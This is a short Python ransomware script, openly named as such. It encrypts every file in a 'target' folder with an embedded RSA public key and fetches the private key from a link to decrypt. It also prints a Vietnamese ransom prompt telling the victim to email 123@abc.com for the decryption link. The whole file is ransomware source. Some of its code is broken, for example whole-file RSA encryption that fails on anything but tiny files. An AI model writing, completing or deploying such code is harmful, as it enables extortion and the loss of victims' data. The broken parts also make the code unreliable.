import os
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import requests

class Ransomware:
    def __init__(self):
        self.path_folder='target'
        self.public_key ="""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA+cE6ecFujM4zBHQPAtzG
xk8i2YIosePOeDV9h//uI2U34vW6S4P1mmnlAtjwg8IzEsQIHh1mgs2gYbmp+Nar
BvWfT8YERILphsQ1qg0VikhuvLPJDunsEAOSczoy5jGa+19vXHxppFH37bL1qxSb
BdsiQPu5NeJ1jixH5okqugKsMYrUH/u8HpJZWkmOujhUezfdY1wY5ylQjYa5luf7
RWSG+Sn4xNLe5dTURNoJSSbYkI/JpQhCgbMQmn8B6YJuCaxuLtjyzMV254NxxdNp
GG/h+fUjqOHqrACFWfKyIzPypQOKICPOZ2P8ffrDiRmRB96mKNoHhSz42MNk7RmX
+wIDAQAB
-----END PUBLIC KEY-----"""
        print('''
        
        |||.  |||.  ||||||. ||||          |||||
        |||   |||  |||      ||||||       ||||||
        ||||||||| |||.      |||| |||.   ||| |||
        |||.  ||| |||       ||||. |||. |||. |||
        |||.  |||. |||      ||||   ||||||   |||
        |||.  |||   ||||||| ||||.   ||||.   |||
        ''')




    def remove_file(self,path):
        os.remove(path)

    def encrypt(self,dataFile):
        with open(dataFile, 'rb') as f:
            data = f.read()
        # public_key = base64.b64decode(self.public_key)
        data = bytes(data)
        # print(public_key)
        public_key = RSA.importKey(self.public_key)
        cipher = PKCS1_OAEP.new(public_key)
        ciphertext = cipher.encrypt(data)
        [ fileName, fileExtension ] = dataFile.split('.')
        encryptedFile = fileName + '_encrypted.' + fileExtension
        with open(encryptedFile, 'wb') as f:
            f.write(ciphertext)


    def decrypt(self,dataFile):

        with open(dataFile, 'rb') as f:
            data = f.read()
        data = bytes(data)
        cipher = PKCS1_OAEP.new(self.private_key)
        decrypt_data =  cipher.decrypt(data)
        # [ fileName, fileExtension ] = dataFile.split('.')
        encryptedFile = dataFile.replace('_encrypted','_decrypted')
        with open(encryptedFile, 'wb') as f:
            f.write(decrypt_data)
    
    def run(self):
        for f in os.listdir(self.path_folder):
            self.encrypt(os.path.join(self.path_folder,f))
    def decrypt_folder(self,link):
        private = requests.get(link)
        self.private_key = RSA.import_key(private.text)
        for f in os.listdir(self.path_folder):
            if ('_encrypted' in f):
                self.decrypt(os.path.join(self.path_folder,f))
    def get_link_decrypt(self):
        print('liên hệ 123@abc.com để nhận link giải mã')
        print('Nhập mã tại đây')
        a = input()
        self.decrypt_folder(a)

rans =Ransomware()
rans.get_link_decrypt()
